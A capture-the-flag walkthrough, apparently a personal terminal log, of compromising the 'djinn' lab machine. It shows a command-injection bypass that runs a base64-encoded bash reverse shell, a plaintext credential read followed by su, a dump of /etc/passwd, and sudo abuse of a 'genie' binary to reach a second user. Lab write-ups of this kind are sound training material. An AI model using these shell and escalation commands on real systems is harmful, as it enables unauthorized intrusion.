oot@Blue3:.../djinn# py2 43905.py 192.168.1.5 7331 192.168.1.7 3592
[-] Debug is not enabled

Testing is not success since netcat to djinn:7331 won't show anything (No "Werkzeug" in response).
Let's try on HTTP

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

root@Blue3:~# curl http://djinn.ctf:7331/genie
...
    <p> It&#39;s not that hard </p>
  <img class="foregroundimg" src="https://www.blissfullemon.com/wp-content/uploads/2018/09/HauntedHouseForeground.png" alt="haunted house">

</div>
<h1 class="errorcode">ERROR 403</h1>
<div class="errortext">This area is forbidden. Turn back now!</div>
<!-- <p> Template taken from freefrontend.com</p> -->
</body>
</html>

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

root@Blue3:~# curl http://djinn.ctf:7331/genie?name=Wrong+choice+of+words
...
    <p> Wrong choice of words </p>
  <img class="foregroundimg" src="https://www.blissfullemon.com/wp-content/uploads/2018/09/HauntedHouseForeground.png" alt="haunted house">

</div>
<h1 class="errorcode">ERROR 403</h1>
<div class="errortext">This area is forbidden. Turn back now!</div>
<!-- <p> Template taken from freefrontend.com</p> -->
</body>
</html>

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

With: "cat /etc/passwd"
=> Wrong choice of words. Maybe it's command restriction.
Test again with: "uname -a && id"
=>
<p> Linux djinn 4.15.0-66-generic #75-Ubuntu SMP Tue Oct 1 05:24:09 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
 </p>
  <img class="foregroundimg" src="https://www.blissfullemon.com/wp-content/uploads/2018/09/HauntedHouseForeground.png" alt="haunted house">

</div>
<h1 class="errorcode">ERROR 403</h1>
<div class="errortext">This area is forbidden. Turn back now!</div>

OK Got it. Now i need a shell

There's bash command which can connect to my listening netcat:
---
Bash /dev/tcp/$host/$port
Reverse Shell: bash -i >& /dev/tcp/<target>/<port> 0>&1
---
=> bash -i >& /dev/tcp/192.168.1.7/5555 0>&1

It's restricted. But if we encode it, using base64 or any similar then decode, using bash after:
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNy81NTU1IDA+JjEK | base64 -d | bash
=> we got the shell
root@Blue3:~# nc -lvnp 5555
listening on [any] 5555 ...
connect to [192.168.1.7] from (UNKNOWN) [192.168.1.5] 42298
bash: cannot set terminal process group (854): Inappropriate ioctl for device
bash: no job control in this shell
www-data@djinn:/opt/80$

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

www-data@djinn:/opt/80$ ls -ltra
ls -ltra
total 28
drwxr-xr-x 5 www-data www-data 4096 Nov 13  2019 static
-rw-r--r-- 1 www-data www-data 1323 Nov 13  2019 app.py
drwxr-xr-x 2 www-data www-data 4096 Nov 14  2019 templates
drwxr-xr-x 4 root     root     4096 Nov 14  2019 ..
-rw-r--r-- 1 www-data www-data 1846 Nov 14  2019 app.pyc
-rw-r--r-- 1 www-data www-data   42 Nov  5 00:57 xargs
drwxr-xr-x 4 www-data www-data 4096 Nov  5 00:57 .
www-data@djinn:/opt/80$ cat static
cat static
cat: static: Is a directory
www-data@djinn:/opt/80$ cat app.py
cat app.py
import subprocess

from flask import Flask, redirect, render_template, request, url_for

app = Flask(__name__)
app.secret_key = "key"

CREDS = "/home/nitish/.dev/creds.txt"

RCE = ["/", ".", "?", "*", "^", "$", "eval", ";"]


def validate(cmd):
    if CREDS in cmd and "cat" not in cmd:
        return True

    try:
        for i in RCE:
            for j in cmd:
                if i == j:
                    return False
        return True
    except Exception:
        return False


@app.route("/", methods=["GET"])
def index():
    return render_template("main.html")


@app.route("/wish", methods=['POST', "GET"])
def wish():
    execute = request.form.get("cmd")
    if execute:
        if validate(execute):
            output = subprocess.Popen(execute, shell=True,
                                      stdout=subprocess.PIPE).stdout.read()
        else:
            output = "Wrong choice of words"

        return redirect(url_for("genie", name=output))
    else:
        return render_template('wish.html')


@app.route('/genie', methods=['GET', 'POST'])
def genie():
    if 'name' in request.args:
        page = request.args.get('name')
    else:
        page = "It's not that hard"

    return render_template('genie.html', file=page)


if __name__ == "__main__":
    app.run(host='0.0.0.0', debug=True)

------
OK that's why, it removes all necessary characters so I cannot get in with normal command.
Also:
CREDS = "/home/nitish/.dev/creds.txt"
www-data@djinn:/opt/80$ cat /home/nitish/.dev/creds.txt
cat /home/nitish/.dev/creds.txt
nitish:p4ssw0rdStr3r0n9

www-data@djinn:/home/nitish/.dev$ ls -ltra
ls -ltra
total 12
-rw-r--r-- 1 nitish nitish   24 Oct 21  2019 creds.txt

That's weird because /home/nitish is set permission on nitish, but this file is not lol
Since SSH is closed => We try su


#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

su nitish
Password: p4ssw0rdStr3r0n9
nitish@djinn:/opt/80$ whoami
nitish

nitish@djinn:~$ ls -ltra
ls -ltra
total 32
drwxr-xr-x 2 nitish nitish 4096 Oct 21  2019 .dev
drwx------ 3 nitish nitish 4096 Nov 11  2019 .gnupg
drwx------ 2 nitish nitish 4096 Nov 11  2019 .cache
-rw-r--r-- 1 nitish nitish 3771 Nov 11  2019 .bashrc
-rw------- 1 root   root    130 Nov 12  2019 .bash_history
-rw-r----- 1 nitish nitish   33 Nov 12  2019 user.txt
drwxr-xr-x 5 nitish nitish 4096 Nov 12  2019 .
drwxr-xr-x 4 root   root   4096 Nov 14  2019 ..
nitish@djinn:~$ cat user.txt
cat user.txt
10aay8289ptgguy1pvfa73alzusyyx3c

nitish@djinn:~/.dev$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sam:x:1000:1000:sam,,,:/home/sam:/bin/bash
ftp:x:111:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
nitish:x:1001:1001::/home/nitish:/bin/bash

nitish@djinn:~/.dev$ sudo -l
sudo -l
Matching Defaults entries for nitish on djinn:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nitish may run the following commands on djinn:
    (sam) NOPASSWD: /usr/bin/genie

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

nitish@djinn:~/.dev$ sudo -u sam genie -e echo OK
sudo -u sam genie -e echo OK
You are a noob hacker!!
nitish@djinn:~/.dev$ sudo -u sam genie -e python -c 'import pty;pty.spawn("/bin/bash")'
<ie -e python -c 'import pty;pty.spawn("/bin/bash")'
Pass your wish to GOD, he might be able to help you.
nitish@djinn:~/.dev$ sudo -u sam genie -g -e python -c 'import pty;pty.spawn("/bin/bash")'
<-g -e python -c 'import pty;pty.spawn("/bin/bash")'
We've added your wish to our records.
Continue praying!!

I'm stuck here a little while, because i don't know which restriction is on the genie file. Ok time to find out:

nitish@djinn:~/.dev$ strings /usr/bin/genie
...
We've added your wish to our records.
Pass your wish to GOD, he might be able to help you.
I know you've came to me bearing wishes                                                     in mind. So go ahead make your wishes.
/bin/ping google.com >/dev/null
You are a noob hacker!!
pass the wish to god
cline_in_traceback
Continue praying!!
execute command
Gives you shell
Enter your wish
ArgumentParser
add_argument
description
store_true
parse_args
genie.py
argparse
SUPPRESS
shell
default
allowed
whoami
system
substr
string
parser
my man!!
main
__import__
exec
/bin/sh
action
valid
--shell
print
lower
genie
wish
__test__
root
__name__
__main__
help
exit
--exec
bash
args
--god
-cmd
/bin/
;*3$"
GCC: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
genie.c
...

nitish@djinn:~/.dev$ sudo -u sam /usr/bin/genie -cmd id
sudo -u sam /usr/bin/genie -cmd id
my man!!
$ whoami
sam
$ python -c 'import pty;pty.spawn("/bin/bash")'
sam@djinn:~/.dev$

sam@djinn:~/.dev$ cd /home/sam
cd /home/sam
sam@djinn:/home/sam$ ls -ltra
ls -ltra
stotal 36
-rw-r--r-- 1 sam  sam   807 Oct 20  2019 .profile
-rw-r--r-- 1 sam  sam  3771 Oct 20  2019 .bashrc
-rw-r--r-- 1 root root  220 Oct 20  2019 .bash_logout
drwx------ 3 sam  sam  4096 Oct 20  2019 .gnupg
-rw-r--r-- 1 sam  sam  1749 Nov  7  2019 .pyc
-rw-r--r-- 1 sam  sam     0 Nov  7  2019 .sudo_as_admin_successful
drwx------ 2 sam  sam  4096 Nov 11  2019 .cache
drwxr-xr-x 4 root root 4096 Nov 14  2019 ..
-rw------- 1 root root  417 Nov 14  2019 .bash_history
drwxr-x--- 4 sam  sam  4096 Nov 14  2019 .
sam@djinn:/home/sam$sudo -l
sudo -l
Matching Defaults entries for sam on djinn:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sam may run the following commands on djinn:
    (root) NOPASSWD: /root/lago

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#
